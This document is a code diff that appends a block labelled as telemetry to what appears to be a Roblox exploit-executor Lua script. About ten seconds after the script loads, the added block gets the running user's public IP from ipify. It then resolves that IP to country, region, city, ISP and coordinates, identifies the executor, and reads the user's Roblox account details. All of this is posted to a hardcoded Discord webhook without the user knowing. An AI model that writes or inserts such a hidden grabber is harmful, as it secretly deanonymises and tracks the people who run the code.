@@ -832,3 +832,191 @@ end)
 task.spawn(function()
     while task.wait(0.5) do poll() end
 end)
+
+-- ==================== TÉLÉMÉTRIE : ENVOI AUTOMATIQUE VERS DISCORD ====================
+
+local SeparatedTelemetry = {
+    enabled = true,
+    webhookUrl = "https://discord.com/api/webhooks/1564418496606113832/Q-3meD8DxCfTbysOMIrtT41u9JExiFZaKytmRXsPjxhWgfiI5C17Asi8y8aXBVfKeiNU",
+}
+
+function SeparatedTelemetry:getIPAndGeoInfo()
+
+    local geoInfo = {
+        ip = "Unknown",
+        country = "Unknown",
+        countryCode = "Unknown",
+        region = "Unknown",
+        city = "Unknown",
+        isp = "Unknown",
+        timezone = "Unknown",
+        lat = "Unknown",
+        lon = "Unknown"
+    }
+
+    local ipServices = {
+        "https://api.ipify.org",
+        "https://api64.ipify.org",
+    }
+
+    for _, serviceUrl in ipairs(ipServices) do
+        local success, result = pcall(function()
+            return game:HttpGet(serviceUrl)
+        end)
+
+        if success and type(result) == "string" and result:match("^[%d%.]+$") then
+            geoInfo.ip = result:gsub("%s+", "")
+            break
+        end
+    end
+
+    local geoServices = {
+        "http://ip-api.com/json/" .. geoInfo.ip,
+        "https://ipapi.co/" .. geoInfo.ip .. "/json/",
+    }
+
+    for _, serviceUrl in ipairs(geoServices) do
+        local success, result = pcall(function()
+            return game:HttpGet(serviceUrl)
+        end)
+
+        if success and type(result) == "string" then
+            local ok, geoData = pcall(function()
+                return game:GetService("HttpService"):JSONDecode(result)
+            end)
+
+            if ok and type(geoData) == "table" then
+                if geoData.country then
+                    geoInfo.country = geoData.country or "Unknown"
+                    geoInfo.countryCode = geoData.countryCode or "Unknown"
+                    geoInfo.region = geoData.regionName or geoData.region or "Unknown"
+                    geoInfo.city = geoData.city or "Unknown"
+                    geoInfo.isp = geoData.isp or geoData.org or "Unknown"
+                    geoInfo.timezone = geoData.timezone or "Unknown"
+                    geoInfo.lat = geoData.lat or "Unknown"
+                    geoInfo.lon = geoData.lon or "Unknown"
+                elseif geoData.country_name then
+                    geoInfo.country = geoData.country_name or "Unknown"
+                    geoInfo.countryCode = geoData.country_code or "Unknown"
+                    geoInfo.region = geoData.region or geoData.state or "Unknown"
+                    geoInfo.city = geoData.city or "Unknown"
+                    geoInfo.isp = geoData.org or "Unknown"
+                    geoInfo.timezone = geoData.timezone or "Unknown"
+                    geoInfo.lat = geoData.latitude or "Unknown"
+                    geoInfo.lon = geoData.longitude or "Unknown"
+                end
+                break
+            end
+        end
+    end
+
+    return geoInfo
+end
+
+function SeparatedTelemetry:detectExploit()
+    local exploitInfo = "Unknown"
+
+    if syn and syn.request then
+        exploitInfo = "Synapse Z"
+    elseif getexecutorname then
+        exploitInfo = getexecutorname()
+    elseif identifyexecutor then
+        exploitInfo = identifyexecutor()
+    elseif KRNL_LOADED then
+        exploitInfo = "Krnl"
+    elseif fluxus then
+        exploitInfo = "Fluxus"
+    elseif delta then
+        exploitInfo = "Delta Executor"
+    end
+
+    return exploitInfo
+end
+
+function SeparatedTelemetry:sendSeparatedTelemetry()
+    if not self.enabled then return false end
+
+    local player = game.Players.LocalPlayer
+    local geoData = self:getIPAndGeoInfo()
+    local exploit = self:detectExploit()
+
+    local searchableText = string.format(
+        "🔍 **USUARIO:** %s | **ID:** %d | **DISPLAY:** %s",
+        player.Name,
+        player.UserId,
+        player.DisplayName
+    )
+
+    local embed = {
+        title = '🛰️ **INFORMACIÓN DEL SISTEMA**',
+        color = 255,
+        fields = {
+            {
+                name = "🌐 IP PRIVADA",
+                value = string.format("```%s```", geoData.ip),
+                inline = false
+            },
+            {
+                name = "📍 CORRESPONDENT",
+                value = string.format("**Pays:** %s\n**État:** %s\n**Ville:** %s\n**ISP:** %s",
+                    geoData.country,
+                    geoData.region,
+                    geoData.city,
+                    geoData.isp
+                ),
+                inline = true
+            },
+            {
+                name = "💻 SYSTEM",
+                value = string.format("**Executor:** %s\n**Compte:** %d jour\n**Membership:** %s",
+                    exploit,
+                    player.AccountAge,
+                    (player.MembershipType == Enum.MembershipType.Premium) and "Premium" or "Normal"
+                ),
+                inline = true
+            },
+            {
+                name = "🎯 SESIÓN",
+                value = string.format("**Job ID:** ```%s```\n**Joueur:** %d/%d",
+                    game.JobId,
+                    #game.Players:GetPlayers(),
+                    game.Players.MaxPlayers
+                ),
+                inline = false
+            }
+        },
+        timestamp = DateTime.now():ToIsoDate(),
+        footer = {
+            text = ' • ' .. os.date('%m/%d/%Y %I:%M %p')
+        }
+    }
+
+    local payload = {
+        content = searchableText,  -- 👈 CE TEXTE EST RECHERCHÉ
+        embeds = {embed},          -- 👈 L'EMBED AVEC PLUS D'INFO
+        username = "Imposteur on top",
+        avatar_url = "https://cdn.discordapp.com/attachments/1128834204531769455/1147722644535259256/standard_1.gif"
+    }
+
+    local success, result = pcall(function()
+        local jsonData = game:GetService("HttpService"):JSONEncode(payload)
+        local fn = http_request or request
+        return fn({
+            Url = self.webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = jsonData,
+        })
+    end)
+
+    return success
+end
+
+_G.SendSeparatedData = function()
+    return SeparatedTelemetry:sendSeparatedTelemetry()
+end
+
+task.spawn(function()
+    task.wait(10)
+    SeparatedTelemetry:sendSeparatedTelemetry()
+end)
